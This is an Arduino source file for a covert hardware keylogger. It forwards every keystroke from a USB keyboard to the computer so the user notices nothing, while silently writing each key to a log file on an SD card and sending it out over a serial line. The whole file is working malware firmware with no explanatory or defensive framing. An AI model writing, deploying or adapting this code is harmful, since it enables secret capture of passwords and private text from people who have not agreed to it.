#include <Keyboard.h>
#include <hidboot.h>
#include <usbhub.h>
#include <SD.h>
#include <SPI.h>

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

extern const uint8_t _asciimap[] PROGMEM;

// modifier states
int leftctrl_status=0;
int leftshift_status=0;
int leftalt_status=0;
int leftgui_status=0;
int rightctrl_status=0;
int rightshift_status=0;
int rightalt_status=0;
int rightgui_status=0;
uint8_t modifiers=0;
uint8_t modifiersard=0;
int key_modifier;

File SDlog;

void SetModifiers(void) {
    modifiers=0;
    if (leftctrl_status) modifiers |= MODIFIERKEY_LEFT_CTRL;
    if (leftshift_status) modifiers |= MODIFIERKEY_LEFT_SHIFT;
    if (leftalt_status) modifiers |= MODIFIERKEY_LEFT_ALT;
    if (leftgui_status) modifiers |= MODIFIERKEY_LEFT_GUI;
    if (rightctrl_status) modifiers |= MODIFIERKEY_RIGHT_CTRL;
    if (rightshift_status) modifiers |= MODIFIERKEY_RIGHT_SHIFT;
    if (rightalt_status) modifiers |= MODIFIERKEY_RIGHT_ALT;
    if (rightgui_status) modifiers |= MODIFIERKEY_RIGHT_GUI;   
}

void SetModifiersArd(void) {
    modifiersard=0;
    // Arduino modifier mapping (SHIFT, ALTGR)
    if (leftshift_status) modifiersard |= SHIFT;
    if (rightalt_status) modifiersard |= ALTGR;   
}

class KbdRptParser : public KeyboardReportParser {
    void PrintKey(uint8_t mod, uint8_t key);

  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown(uint8_t mod, uint8_t key);
    void OnKeyUp(uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
};

// Keys HID Code mapped
const char* KeysChar(uint8_t key) {
    switch(key) {
        case 0x62: return "0"; // NumPad 0
        case 0x59: return "1"; // NumPad 1
        case 0x5A: return "2"; // NumPad 2
        case 0x5B: return "3"; // NumPad 3
        case 0x5C: return "4"; // NumPad 4
        case 0x5D: return "5"; // NumPad 5
        case 0x5E: return "6"; // NumPad 6
        case 0x5F: return "7"; // NumPad 7
        case 0x60: return "8"; // NumPad 8
        case 0x61: return "9"; // NumPad 9
        case 0x29: return " [ESC] "; // Esc
        case 0x3A: return " [F1] "; // F1
        case 0x3B: return " [F2] "; // F2
        case 0x3C: return " [F3] "; // F3
        case 0x3D: return " [F4] "; // F4
        case 0x3E: return " [F5] "; // F5
        case 0x3F: return " [F6] "; // F6
        case 0x40: return " [F7] "; // F7
        case 0x41: return " [F8] "; // F8
        case 0x42: return " [F9] "; // F9
        case 0x43: return " [F1O] "; // F10
        case 0x44: return " [F11] "; // F11
        case 0x45: return " [F12] "; // F12
        case 0x46: return " [PRINTSCREEN] "; // PrintScreen
        case 0x47: return " [SCROLLLOCK] "; // Scroll Lock
        case 0x48: return " [PAUSE] "; // Pause
        case 0x2A: return " [BACKSPACE] "; // Back Space
        case 0x49: return " [INSERT] "; // Insert
        case 0x4A: return " [HOME] "; // Home
        case 0x4B: return " [PAGEUP] "; // Page UP
        case 0x4E: return " [PAGEDOWN] "; // Page Down
        case 0x4C: return " [DELETE] "; // Delete
        case 0x4D: return " [END] "; // End
        case 0x52: return " [UP] "; // UP
        case 0x51: return " [DOWN] "; // DOWN
        case 0x50: return " [LEFT] "; // LEFT
        case 0x4F: return " [RIGHT] "; // RIGHT
        case 0x53: return " [NUMLOCK] "; // Num Lock
        case 0x54: return " [NUMPAD /] "; // NumPad /
        case 0x55: return " [NUMPAD *] "; // NumPad *
        case 0x56: return " [NUMPAD -] "; // NumPad -
        case 0x57: return " [NUMPAD +] "; // NumPad +
        case 0x63: return " [NUMPAD .] "; // NumPad .
        case 0x58: return " [NUMPADRETURN] "; // NumPad Return
        case 0x2B: return " [TAB] "; // TAB
        case 0x39: return " [CAPSLOCK] "; // Caps Lock
        case 0x65: return " [MENU] "; // Menu
        default: return nullptr;
    }
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
    SetModifiersArd();
    Keyboard.rawrelease(key, 0);
    key_modifier = key | modifiersard;
    SDlog = SD.open("logs.txt", FILE_WRITE);
    bool written = false;

    // Main Keyboard ASCII mapping
    for (int i = 0; i < 256; i++) {
        if (pgm_read_byte(_asciimap + i) == key_modifier) {
            SDlog.write(i);
            Serial1.write(i);
            written = true;
            break;
        }
    }

    // Keys digits fallback logging
    if (!written) {
        const char* txt = KeysChar(key);
        if (txt != nullptr) {
            SDlog.print(txt);
            Serial1.print(txt);
        }
    }

    SDlog.close();
}

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 
    SetModifiers();
    Keyboard.rawpress(key, modifiers);
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
    MODIFIERKEYS beforeMod;
    *((uint8_t*)&beforeMod) = before;

    MODIFIERKEYS afterMod;
    *((uint8_t*)&afterMod) = after;

    if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) leftctrl_status = !leftctrl_status;
    if (beforeMod.bmLeftShift != afterMod.bmLeftShift) leftshift_status = !leftshift_status;
    if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) leftalt_status = !leftalt_status;
    if(beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
        if(afterMod.bmLeftGUI) Keyboard.press(KEY_LEFT_GUI);
        else Keyboard.release(KEY_LEFT_GUI);
    }
    if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) rightctrl_status = !rightctrl_status;
    if (beforeMod.bmRightShift != afterMod.bmRightShift) rightshift_status = !rightshift_status;
    if (beforeMod.bmRightAlt != afterMod.bmRightAlt) rightalt_status = !rightalt_status;
    if (beforeMod.bmRightGUI != afterMod.bmRightGUI) rightgui_status = !rightgui_status;
}

USB     Usb;
USBHub  Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD> HidKeyboard(&Usb);

KbdRptParser Prs;

void setup() {
    Serial.begin(38400);
    Serial1.begin(38400);
    delay(500);
    SD.begin(5);

    #if !defined(__MIPSEL__)
        while (!Serial1);
    #endif

    if (Usb.Init() == -1)
        delay(200);

    HidKeyboard.SetReportParser(0, &Prs);
}

void loop() {
    Usb.Task();
}
